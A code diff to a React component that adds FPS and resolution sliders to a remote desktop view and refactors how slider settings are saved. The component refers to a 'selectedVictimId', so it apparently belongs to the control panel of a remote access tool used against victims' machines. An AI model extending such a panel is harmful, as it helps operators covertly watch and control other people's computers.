@@ -79,21 +79,29 @@ export function RemoteDesktopSection() {
     }, [detail.selectedVictimId, qc, ws]);
 
     useEffect(() => {
-        const soundSlider = document.getElementById("remoteDesktopSound") as HTMLInputElement | null;
-        const soundValue = document.getElementById("remoteDesktopSoundValue");
+        const cleanups: (() => void)[] = [];
 
-        if (soundSlider) {
-            const saved = readLocal("rd_sound", 50);
-            soundSlider.value = String(saved);
-            if (soundValue) soundValue.textContent = String(saved);
-            const onSound = () => {
-                const v = parseInt(soundSlider.value, 10);
-                if (soundValue) soundValue.textContent = String(v);
-                writeLocal("rd_sound", v);
+        const wire = (id: string, valueId: string, storageKey: string, fallback: number) => {
+            const slider = document.getElementById(id) as HTMLInputElement | null;
+            const valueEl = document.getElementById(valueId);
+            if (!slider) return;
+            const saved = readLocal(storageKey, fallback);
+            slider.value = String(saved);
+            if (valueEl) valueEl.textContent = String(saved);
+            const handler = () => {
+                const v = parseInt(slider.value, 10);
+                if (valueEl) valueEl.textContent = String(v);
+                writeLocal(storageKey, v);
             };
-            soundSlider.addEventListener("input", onSound);
-            return () => soundSlider.removeEventListener("input", onSound);
-        }
+            slider.addEventListener("input", handler);
+            cleanups.push(() => slider.removeEventListener("input", handler));
+        };
+
+        wire("remoteDesktopFps", "remoteDesktopFpsValue", "rd_fps", 30);
+        wire("remoteDesktopResolution", "remoteDesktopResolutionValue", "rd_resolution", 75);
+        wire("remoteDesktopSound", "remoteDesktopSoundValue", "rd_sound", 50);
+
+        return () => cleanups.forEach((fn) => fn());
     }, []);
 
     return (
@@ -115,6 +123,34 @@ export function RemoteDesktopSection() {
                         >
                             <div className="w-[24px]" />
                             <div className="flex flex-1 items-center justify-center gap-[18px]">
+                                <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
+                                    <span className="font-semibold">FPS</span>
+                                    <input
+                                        id="remoteDesktopFps"
+                                        className="rd-slider"
+                                        type="range"
+                                        min={1}
+                                        max={60}
+                                        defaultValue={readLocal("rd_fps", 30)}
+                                    />
+                                    <span id="remoteDesktopFpsValue" className="min-w-[26px] text-right font-bold">
+                                        {readLocal("rd_fps", 30)}
+                                    </span>
+                                </div>
+                                <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
+                                    <span className="font-semibold">Res</span>
+                                    <input
+                                        id="remoteDesktopResolution"
+                                        className="rd-slider"
+                                        type="range"
+                                        min={10}
+                                        max={100}
+                                        defaultValue={readLocal("rd_resolution", 75)}
+                                    />
+                                    <span id="remoteDesktopResolutionValue" className="min-w-[26px] text-right font-bold">
+                                        {readLocal("rd_resolution", 75)}%
+                                    </span>
+                                </div>
                                 <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
                                     <span className="font-semibold">Sound</span>
                                     <input
